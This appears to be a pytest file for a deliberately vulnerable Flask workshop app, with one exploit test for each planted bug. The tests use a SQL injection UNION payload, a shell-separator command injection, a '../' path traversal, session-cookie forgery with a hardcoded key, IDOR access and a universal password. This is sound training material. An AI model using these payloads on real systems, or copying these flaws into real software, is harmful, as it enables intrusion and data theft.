"""One exploit per planted bug.

Each test proves the corresponding defect in PLANTED.md is real and
reachable. If one of these tests starts failing, the bug it covers has
been fixed and PLANTED.md is out of date.
"""

from flask.sessions import SecureCookieSessionInterface

import app as app_module
import models
import storage
from conftest import login


def test_bug_1_bola_alice_can_read_bobs_order(client):
    """BOLA (IDOR) on GET /api/orders/<id>.

    Order 4 belongs to bob. Alice asks for it directly and gets it,
    because require_order_access only checks that someone is logged in.
    """
    login(client, "alice")

    response = client.get("/api/orders/4")

    assert response.status_code == 200
    order = response.get_json()["order"]
    assert order["user_id"] == 2
    assert order["item"] == "Noise cancelling headphones"


def test_bug_2_sql_injection_leaks_password_hashes(client):
    """SQL injection in the order search.

    The search term is formatted into the query, so a UNION pulls rows
    out of the users table, which the endpoint never intended to expose.
    """
    login(client, "alice")

    payload = "x%' UNION SELECT id, password_hash FROM users --"
    results = client.get("/api/search", query_string={"q": payload}).get_json()["results"]

    leaked = {r["item"] for r in results}
    assert "pbkdf2$demo$alice-not-a-real-hash" in leaked
    assert "pbkdf2$demo$bob-not-a-real-hash" in leaked


def test_bug_3_hardcoded_secret_allows_session_forgery(client):
    """Hardcoded Flask secret key in app.py.

    The key is a literal in source, so anyone who reads the repository
    can mint a valid session cookie for any user without a password.
    """
    key_from_source = "sk-workshop-9f3a2b7c1e4d8a6b"
    assert app_module.app.secret_key == key_from_source

    serializer = SecureCookieSessionInterface().get_signing_serializer(app_module.app)
    forged = serializer.dumps({"user_id": 2, "username": "bob"})
    client.set_cookie("session", forged, domain="localhost")

    orders = client.get("/api/orders").get_json()["orders"]

    assert {o["user_id"] for o in orders} == {2}


def test_bug_4_command_injection_in_export(client):
    """Command injection in GET /api/export.

    generate_report builds a shell string from the format parameter and
    runs it with shell=True, so a shell separator chains a new command.
    """
    login(client, "alice")

    response = client.get("/api/export", query_string={"format": "csv & echo INJECTED"})

    assert response.status_code == 200
    assert "INJECTED" in response.get_json()["output"]


def test_bug_5_path_traversal_escapes_the_upload_directory(client):
    """Path traversal in GET /api/download.

    The name parameter is joined onto the upload directory with no
    validation, so .. walks out of it.
    """
    login(client, "alice")

    outside = storage.BASE_DIR / "internal_notes.txt"
    assert outside.is_file(), "fixture file missing, the test cannot prove anything"

    response = client.get("/api/download", query_string={"name": "../internal_notes.txt"})

    assert response.status_code == 200
    assert b"INTERNAL ONLY" in response.data


def test_bug_6_one_hardcoded_password_logs_in_as_every_user(client):
    """Hardcoded universal password in verify_password.

    The stored hash for each user is a template built from the username,
    so it holds nothing secret, and the real check is a literal compared in
    source. Anyone who can read the repository can log in as any user.
    """
    for username in ("alice", "bob"):
        user = models.get_user_by_username(username)
        assert user["password_hash"] == "pbkdf2$demo$%s-not-a-real-hash" % username

        response = login(client, username, "password123")

        assert response.status_code == 200
        assert response.get_json()["user_id"] == user["id"]
        client.post("/api/logout")
